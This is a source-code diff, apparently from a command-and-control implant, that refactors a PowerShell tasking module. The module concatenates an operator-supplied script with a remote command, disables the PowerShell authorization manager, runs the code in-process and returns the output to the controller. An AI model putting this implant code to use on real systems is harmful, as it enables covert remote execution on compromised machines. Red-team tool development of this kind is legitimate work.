@@ -352,88 +352,78 @@ namespace Tasks
                 }
             };
         }
+        
 
-        public override void Kill()
+        public override void Start()
         {
-            base.Kill();
-        }
-
-        public override ST.Task CreateTasking()
-        {
-            return new ST.Task(() =>
+            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
+            TaskResponse resp;
+            string cmd = "";
+            var loadedScript = _agent.GetFileManager().GetScript();
+            if (!string.IsNullOrEmpty(loadedScript))
             {
-                System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
-                TaskResponse resp;
-                string cmd = "";
-                var loadedScript = _agent.GetFileManager().GetScript();
-                if (!string.IsNullOrEmpty(loadedScript))
+                cmd += loadedScript;
+            }
+
+            PowerShellParameters parameters = _jsonSerializer.Deserialize<PowerShellParameters>(_data.Parameters);
+            cmd += "\n\n" + parameters.Command;
+
+            _agent.AcquireOutputLock();
+
+            TextWriter oldStdout = Console.Out;
+            TextWriter oldStderr = Console.Out;
+            try
+            {
+                EventableStringWriter stdoutSw = new EventableStringWriter();
+
+                stdoutSw.BufferWritten += OnBufferWrite;
+
+                Console.SetOut(stdoutSw);
+                Console.SetError(stdoutSw);
+
+                CustomPowerShellHost psHost = new CustomPowerShellHost();
+                var state = InitialSessionState.CreateDefault();
+                state.AuthorizationManager = null;
+                using (Runspace runspace = RunspaceFactory.CreateRunspace(psHost, state))
                 {
-                    cmd += loadedScript;
-                }
-
-                PowerShellParameters parameters = _jsonSerializer.Deserialize<PowerShellParameters>(_data.Parameters);
-                cmd += "\n\n" + parameters.Command;
-
-                _agent.AcquireOutputLock();
-
-                TextWriter oldStdout = Console.Out;
-                TextWriter oldStderr = Console.Out;
-                try
-                {
-
-                    EventableStringWriter stdoutSw = new EventableStringWriter();
-
-                    stdoutSw.BufferWritten += OnBufferWrite;
-
-                    Console.SetOut(stdoutSw);
-                    Console.SetError(stdoutSw);
-                    using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
+                    runspace.Open();
+                    using (Pipeline pipeline = runspace.CreatePipeline())
                     {
-                        CustomPowerShellHost psHost = new CustomPowerShellHost();
-                        var state = InitialSessionState.CreateDefault();
-                        state.AuthorizationManager = null;
-                        using (Runspace runspace = RunspaceFactory.CreateRunspace(psHost, state))
+                        pipeline.Commands.AddScript(cmd);
+                        pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
+                        pipeline.Commands.Add("Out-Default");
+                        try
                         {
-                            runspace.Open();
-                            using (Pipeline pipeline = runspace.CreatePipeline())
+                            ST.Task.WaitAny(new ST.Task[]
                             {
-                                pipeline.Commands.AddScript(cmd);
-                                pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
-                                pipeline.Commands.Add("Out-Default");
-                                try
-                                {
-                                    ST.Task.WaitAny(new ST.Task[]
-                                    {
-                                        new ST.Task(() => { pipeline.Invoke(); }, _cancellationToken.Token)
-                                    }, _cancellationToken.Token);
-                                }
-                                catch (OperationCanceledException)
-                                {
-                                
-                                }
-                            }
-                        }   
+                                new ST.Task(() => { pipeline.Invoke(); }, _cancellationToken.Token)
+                            }, _cancellationToken.Token);
+                        }
+                        catch (OperationCanceledException)
+                        {
+                        }
                     }
-                    resp = CreateTaskResponse("", true);
-                }
-                catch (Exception ex)
-                {
-                    resp = CreateTaskResponse($"Unhandled exception: {ex.Message}", true, "error");
-                }
-                finally
-                {
-                    Console.SetOut(oldStdout);
-                    Console.SetError(oldStderr);
-                    _agent.ReleaseOutputLock();
-                    _complete = true;
-                    _completed.Set();
                 }
 
+                resp = CreateTaskResponse("", true);
+            }
+            catch (Exception ex)
+            {
+                resp = CreateTaskResponse($"Unhandled exception: {ex.Message}", true, "error");
+            }
+            finally
+            {
+                Console.SetOut(oldStdout);
+                Console.SetError(oldStderr);
+                _agent.ReleaseOutputLock();
+                _complete = true;
+                _completed.Set();
+            }
 
-                // Your code here..
-                // Then add response to queue
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+
+            // Your code here..
+            // Then add response to queue
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
         private void OnBufferWrite(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
